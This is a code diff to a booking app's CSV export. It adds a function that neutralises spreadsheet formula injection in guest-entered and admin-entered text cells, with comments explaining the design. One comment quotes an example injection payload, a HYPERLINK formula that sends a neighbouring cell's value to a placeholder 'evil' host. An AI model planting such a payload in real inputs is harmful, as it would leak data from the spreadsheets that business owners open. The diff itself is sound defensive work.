@@ -29,14 +29,24 @@
  *
  * CRLF line endings and a header row, per the RFC; a field is quoted only when
  * it contains a comma, a double quote, CR or LF, and an inner quote is doubled.
- * **Known limitation, deliberately not addressed here:** a cell whose text
- * begins `=`, `+`, `@` or `-` is interpreted as a FORMULA by Excel and Sheets,
- * and `leadName` in the outstanding report is guest-entered text. Neutralising
- * that means mangling the value (a leading apostrophe or tab) and would have to
- * skip the numeric columns, where a leading `-` is a legitimate overpayment —
- * so it is a decision for the owner rather than something to smuggle in under a
- * reporting task. Flagged in this task's report; see `docs/BUGS_LOG.md` if it
- * has since been logged.
+ *
+ * ## Two escapes, not one: quoting is for the FILE, `csvText` is for the READER
+ *
+ * RFC quoting keeps a comma from splitting a cell. It does nothing at all about
+ * the other hazard, which is that **Excel and Sheets evaluate a cell beginning
+ * `=`, `+`, `-` or `@` as a FORMULA** — so a guest who types
+ * `=HYPERLINK("http://evil/?l="&A2,"Click")` as their name at checkout has
+ * written a live, clickable link into a spreadsheet the owner opens, with the
+ * row beside it as its argument. That is CSV formula injection, and `leadName`
+ * is guest-entered text that reaches this file untouched otherwise.
+ *
+ * `csvText()` neutralises it, and it is applied to **text cells only**. That
+ * distinction is the whole reason there are two functions rather than one
+ * cleverer one: a peso cell legitimately begins with `-` (an overpaid booking),
+ * and prefixing that would corrupt a real figure. No column-type sniffing is
+ * needed to tell them apart, because every money cell below already goes
+ * through `pesosFromCentavos()` individually, beside the text cells rather than
+ * mixed in with them.
  */
 import type {
   DateRangeInput,
@@ -62,6 +72,42 @@ const MUST_QUOTE = /[",\r\n]/;
 export function csvField(value: string): string {
   if (!MUST_QUOTE.test(value)) return value;
   return `"${value.replace(/"/g, '""')}"`;
+}
+
+/**
+ * The leading characters a spreadsheet reads as "this cell is a formula".
+ *
+ * `=` and `+` start a formula outright, `-` starts a negated one, and `@`
+ * starts a legacy Lotus-style function call that Excel still honours. TAB and
+ * CR are here too, for the same reason and because they are on the same
+ * published list: a leading whitespace character is consumed before the parse,
+ * so `\t=cmd` is `=cmd` by the time the cell is evaluated, and a mitigation
+ * that handled four of the six would be a half-closed control.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * One TEXT cell, with any formula-leading character neutralised.
+ *
+ * A single leading apostrophe, which is the standard mitigation: on CSV import
+ * a spreadsheet treats the cell as literal text and the formula never runs. The
+ * apostrophe stays VISIBLE in the cell, and that is the right trade — a name
+ * that reads `'=HYPERLINK(…)` is odd-looking data, while the same name without
+ * it is a live link in the owner's spreadsheet. Nothing is truncated or
+ * rewritten; one character is prepended, and only to a value that begins with
+ * one of six characters.
+ *
+ * **Never call this on a number.** `pesosFromCentavos()`'s output begins with
+ * `-` for an overpaid booking, and prefixing that would turn a real figure into
+ * text. The two are kept apart at the call site, cell by cell — see the module
+ * doc.
+ *
+ * Composes with, rather than replaces, `csvField`: this runs first and
+ * `toCsv()` then quotes the result if it needs quoting, so a hostile name
+ * carrying a comma and a quote as well gets both treatments.
+ */
+export function csvText(value: string): string {
+  return FORMULA_LEAD.test(value) ? `'${value}` : value;
 }
 
 /**
@@ -117,7 +163,8 @@ export function byTourCsv(rows: readonly TourRevenueRow[]): string {
       'Still to collect (PHP)',
     ],
     rows.map((row) => [
-      row.tourTitle,
+      // The one text cell in this file; the other five are numbers we built.
+      csvText(row.tourTitle),
       String(row.bookingCount),
       pesosFromCentavos(row.receivedCentavos),
       pesosFromCentavos(row.refundedCentavos),
@@ -140,11 +187,23 @@ export function outstandingCsv(rows: readonly OutstandingRow[]): string {
       'Outstanding (PHP)',
     ],
     rows.map((row) => [
-      row.ref,
+      /*
+       * The four text cells, each neutralised. `leadName` is the one that
+       * matters most — it is typed by a guest at checkout — but a tour title is
+       * admin-entered text reaching the same spreadsheet, and `ref` and
+       * `status` go through it too rather than being reasoned about: a cell
+       * either is text or is a number we formatted, and every text cell is
+       * treated the same way so none can be forgotten.
+       *
+       * `tourDate` and the three peso cells below are NOT: they are values this
+       * server generated, and an overpaid booking's `-200.00` must stay a
+       * number.
+       */
+      csvText(row.ref),
       row.tourDate,
-      row.tourTitle,
-      row.leadName,
-      row.status,
+      csvText(row.tourTitle),
+      csvText(row.leadName),
+      csvText(row.status),
       pesosFromCentavos(row.totalCentavos),
       pesosFromCentavos(row.paidCentavos),
       pesosFromCentavos(row.outstandingCentavos),
